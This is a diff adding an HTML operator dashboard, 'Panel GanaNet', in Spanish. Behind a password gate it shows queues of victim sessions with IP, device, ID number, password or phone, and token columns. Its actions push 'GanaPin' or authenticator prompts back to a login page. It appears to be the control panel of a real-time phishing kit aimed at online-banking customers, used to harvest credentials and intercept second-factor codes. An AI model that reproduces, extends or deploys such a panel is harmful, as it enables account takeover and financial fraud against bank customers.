@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <title>Panel GanaNet — operador</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover, interactive-widget=resizes-content" />
+  <meta name="theme-color" content="#353131" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="format-detection" content="telephone=no" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
+  <base href="/panel/" />
+  <link rel="stylesheet" href="/panel/panel.css" />
+</head>
+<body>
+  <div id="authGate" class="auth-gate" hidden>
+    <form class="auth-card" id="authForm" autocomplete="off">
+      <h1 class="auth-card__title">Panel GanaNet</h1>
+      <p class="auth-card__sub">Ingresa la clave de operador para continuar</p>
+      <label class="auth-card__label" for="authPassword">Clave</label>
+      <input
+        id="authPassword"
+        class="auth-card__input"
+        type="password"
+        name="password"
+        placeholder="Clave de acceso"
+        autocomplete="current-password"
+        required
+      />
+      <p class="auth-card__error" id="authError" hidden>Clave incorrecta</p>
+      <button type="submit" class="btn btn--ok auth-card__btn">Entrar</button>
+      <a class="auth-card__link" href="/">Ir al login</a>
+    </form>
+  </div>
+
+  <main class="dash is-locked" id="dash" hidden>
+    <header class="toolbar">
+      <div class="toolbar__left">
+        <h1 class="toolbar__title">Panel GanaNet</h1>
+        <span class="toolbar__meta">Sesiones: <strong id="rowCount">0</strong> · Login: GanaPin/Auth/Dispositivo · Habilitar: Listo/Err</span>
+      </div>
+      <div class="toolbar__actions">
+        <button type="button" class="note-bell" id="btnNotes" title="Notas de dispositivo" aria-label="Notas de dispositivo">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path fill="currentColor" d="M6 3h9l5 5v13a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1zm8 1.5V9h4.5L14 4.5zM8 12h8v1.5H8V12zm0 3.5h8V17H8v-1.5zm0-7h4V10H8V8.5z"/>
+          </svg>
+          <span class="note-bell__badge" id="notesBadge" hidden>0</span>
+        </button>
+        <button type="button" class="btn btn--ok" id="btnClean">Limpiar</button>
+        <button type="button" class="btn btn--ghost" id="btnLogout">Salir</button>
+        <a class="btn btn--ghost" href="/">Ir al login</a>
+      </div>
+    </header>
+
+    <p class="empty is-visible" id="emptyState">
+      Cola vacía. Login → Verificar (GanaPin/Auth) o Habilitar dispositivo → Siguiente (Listo/Err).
+    </p>
+
+    <div class="sections" id="sections">
+      <section class="lane lane--1" data-lane="0">
+        <div class="lane__head">
+          <span class="lane__title">Azul</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>User / CI</th>
+              <th>Pass / Cel</th>
+              <th>Token / Ext</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="0"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--2" data-lane="1">
+        <div class="lane__head">
+          <span class="lane__title">Verde</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>User / CI</th>
+              <th>Pass / Cel</th>
+              <th>Token / Ext</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="1"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--3" data-lane="2">
+        <div class="lane__head">
+          <span class="lane__title">Rojo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>User / CI</th>
+              <th>Pass / Cel</th>
+              <th>Token / Ext</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="2"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--4" data-lane="3">
+        <div class="lane__head">
+          <span class="lane__title">Gris</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>User / CI</th>
+              <th>Pass / Cel</th>
+              <th>Token / Ext</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="3"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--5" data-lane="4">
+        <div class="lane__head">
+          <span class="lane__title">Amarillo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>User / CI</th>
+              <th>Pass / Cel</th>
+              <th>Token / Ext</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="4"></tbody>
+        </table>
+      </section>
+    </div>
+
+    <p class="footer-note" id="hint">
+      En Acciones: GanaPin o Autenticador envían el modal al login.
+    </p>
+  </main>
+
+  <script src="/panel/panel.js"></script>
+</body>
+</html>
